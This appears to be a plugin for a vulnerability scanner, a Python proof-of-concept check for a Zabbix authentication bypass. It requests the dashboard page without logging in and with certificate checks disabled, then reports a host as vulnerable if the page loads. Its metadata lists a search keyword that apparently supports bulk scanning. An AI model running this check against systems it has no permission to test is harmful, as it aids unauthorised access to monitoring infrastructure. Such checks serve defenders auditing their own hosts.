#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import hashlib
import requests
import random
from urllib.parse import urlparse

requests.packages.urllib3.disable_warnings()

def get_plugin_info():
    plugin_info = {
        "name": "zabbix 认证绕过",
        "desc": "zabbix 认证绕过漏洞",
        "grade": "高",
        "type": "web",
        "keyword": "tag:zabbix",
    }
    return plugin_info

def poc(arg):
    arg = arg if "://" in arg else f"http://{arg}"
    timeout = 5
    headers = {
        'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36",
        'Referer': arg
        }
    try:
        r = requests.get(
            url=f'{urlparse(arg).scheme}://{urlparse(arg).netloc}/zabbix.php?action=dashboard.view&dashboardid=1', 
            headers=headers,
            timeout=timeout, 
            verify=False
            )
        if r.status_code == 200 and "<title>Dashboard</title>" in r.text and "<a class=\"top-nav-zbbshare\" target=\"_blank\" title=\"Zabbix Share\" href=\"https://share.zabbix.com/\">Share</a>" in r.text:
            return True
        else:
            return False
    except Exception as e:
        return 


if __name__ == '__main__':
    import sys
    if len(sys.argv) != 2:
        print("{} URL".format(sys.argv[0]))
    else:
        print("{} {}".format(sys.argv[1],poc(sys.argv[1])))  

